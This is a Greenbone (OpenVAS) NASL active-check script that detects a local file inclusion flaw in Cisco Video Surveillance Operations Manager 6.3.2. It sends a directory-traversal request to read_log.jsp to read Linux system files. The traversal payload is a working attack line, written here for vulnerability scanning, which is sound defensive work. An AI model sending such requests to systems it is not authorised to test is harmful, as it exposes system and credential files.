# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:cisco:video_surveillance_manager";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103678");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
  script_cve_id("CVE-2013-3429", "CVE-2013-3430", "CVE-2013-3431");

  script_name("Cisco Video Surveillance Operations Manager Multiple Vulnerabilities (cisco-sa-20130724-vsm) - Active Check");

  script_xref(name:"URL", value:"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20130724-vsm");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/24786");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120790/Cisco-Video-Surveillance-Operations-Manager-6.3.2-XSS-LFI-Bypass.html");

  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-03-14 17:43:31 +0100 (Thu, 14 Mar 2013)");
  script_category(ACT_ATTACK);
  script_family("CISCO");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_cisco_video_surveillance_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cisco_video_surveillance_manager/installed");

  script_tag(name:"summary", value:"Cisco Video Surveillance Operations Manager is prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - A Local file inclusion vulnerability

  - An XSS vulnerability");

  script_tag(name:"affected", value:"Cisco VSM version 6.3.2 is known to be affected. Other versions
  might be affected as well.");

  script_tag(name:"solution", value:"Update to version 7.0.0 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = "/BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../../" + file;

  if(http_vuln_check(port:port, url:url, pattern:pattern)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
